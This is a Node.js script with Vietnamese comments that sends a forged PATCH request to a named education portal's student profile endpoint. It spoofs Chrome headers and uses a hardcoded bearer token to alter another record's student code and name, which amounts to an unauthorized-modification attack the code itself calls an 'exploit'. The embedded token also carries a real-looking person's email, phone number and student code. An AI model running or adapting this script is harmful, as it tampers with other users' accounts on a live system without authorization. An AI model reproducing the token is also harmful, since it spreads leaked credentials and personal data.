import axios from "axios";
import https from "https";

// ============================================================================
// [CONFIG] KHU VỰC CẤU HÌNH (ĐIỀN THÔNG TIN THẬT VÀO ĐÂY)
// ============================================================================

const TARGET_URL =
  "https://apiportal.rikkei.edu.vn/student/profile/update-info";

// [QUAN TRỌNG] Token lấy từ F12 -> Network -> Header "Authorization"
// Định dạng: "eyJhbGciOiJIUz..." (Không bao gồm từ Bearer ở đầu nếu bạn paste vào đây)

// ============================================================================
// [PAYLOAD] Dữ liệu gửi đi (Đã tối ưu để tránh crash server)
// ============================================================================

const payload = {
  id: 102,
  student_code: "Yêu các chị Rikkei xinh đẹp",
  fullName: "Quách Văn Sơn Bách",

};

// ============================================================================
// [HEADERS] Giả lập Full Fingerprint của Chrome trên MacOS/Windows
// ============================================================================
const YOUR_TOKEN =
  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InF1YW5naHV5MjhAZ21haWwuY29tIiwiaWQiOjE5MjcsImZ1bGxOYW1lIjoiTmd1eeG7hW4gUXVhbmcgSHV5IiwiYXZhdGFyIjoiaHR0cHM6Ly9yaWtrZWllZHUtc3RvcmFnZS5zMy5hcC1zb3V0aGVhc3QtMi5hbWF6b25hd3MuY29tL3VwbG9hZHMvODFlYzg5NGUtMmQ2Zi00MzBiLTk1ZjEtNGQ3MzMyMWZlODI0LnBuZyIsInN0dWRlbnRDb2RlIjoiTjI1RFRDTjI2OCIsInBob25lIjoiMDk0MjEzMTIzMiIsInJvbGUiOiJzdHVkZW50Iiwic3lzdGVtSWQiOjgsImlhdCI6MTc3MDE3MTU4MSwiZXhwIjoxNzcwMjAwMzgxfQ.AxzW1VV8Ke4nGO_7qTn0S-E-uFcLxsrddrMaekfpAa0"; // <--- DÁN TOKEN VÀO GIỮA 2 DẤU NGOẶC KÉP
const headers = {
  Authority: "apiportal.rikkei.edu.vn",
  Accept: "application/json, text/plain, /",
  "Accept-Encoding": "gzip, deflate, br, zstd",
  "Accept-Language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",

  // Authorization là CHÌA KHÓA để fix lỗi 500.
  Authorization: `Bearer ${YOUR_TOKEN}`,

  "Content-Type": "application/json",

  // Origin chính xác dựa trên response header bạn cung cấp
  Origin: "https://portal.rikkei.edu.vn",

  // Referer trỏ về đúng trang bài học (Giả lập việc bạn đang xem bài 3982)
  Referer: `https://portal.rikkei.edu.vn/profile`,

  // User-Agent giả lập Chrome mới nhất
  "User-Agent":
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",

  // Các header bảo mật giả lập trình duyệt
  "Sec-Ch-Ua":
    '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
  "Sec-Ch-Ua-Mobile": "?0",
  "Sec-Ch-Ua-Platform": '"Macos"', // Đổi thành "Windows" nếu bạn dùng Win
  "Sec-Fetch-Dest": "empty",
  "Sec-Fetch-Mode": "cors",
  "Sec-Fetch-Site": "same-site",

  // Connection Keep-Alive để duy trì kết nối như người dùng thật
  Connection: "keep-alive",
};

// ============================================================================
// [CORE] Hàm thực thi tấn công
// ============================================================================
async function exploit() {
  if (YOUR_TOKEN === "DÁN_TOKEN_CỦA_BẠN_VÀO_ĐÂY") {
    console.error(
      "[!] LỖI: Bạn chưa điền Token! Request sẽ thất bại (500/401).",
    );
    return;
  }

  try {
    const response = await axios.patch(TARGET_URL, payload, {
      headers: headers,
      // Bypass SSL nếu cần thiết (nhưng Rikkei dùng https chuẩn nên không cần thiết lắm)
      httpsAgent: new https.Agent({ rejectUnauthorized: true }),
      validateStatus: () => true, // Không throw lỗi để ta đọc được response body của lỗi 500
    });

    if (response.status === 201 || response.status === 200) {
      console.log("\n[+] EXPLOIT SUCCESSFUL (Thành công)!");
      console.log("[+] Status Code: 201 Created");
      console.log("[+] Response:", JSON.stringify(response.data, null, 2));
    } else {
      console.log(`\n[-] FAILED with Status: ${response.status}`);
      console.log("[-] Headers trả về:", response.headers);
      console.log("[-] Data trả về:", response.data);

      // Phân tích lỗi
      if (response.status === 500) {
        console.log("\n[!!!] PHÂN TÍCH LỖI 500:");
        console.log("1. Token của bạn có thể đã hết hạn hoặc sai format.");
        console.log(
          '2. Payload "lessonId" có thể không tồn tại trong Database.',
        );
        console.log(
          "3. Hãy thử bật F12 trên trình duyệt, làm thủ công 1 lần và copy y hệt Payload.",
        );
      }
    }
  } catch (error) {
    console.error("\n[!] LỖI MẠNG (NETWORK ERROR):", error.message);
  }
}

// Chạy
exploit();
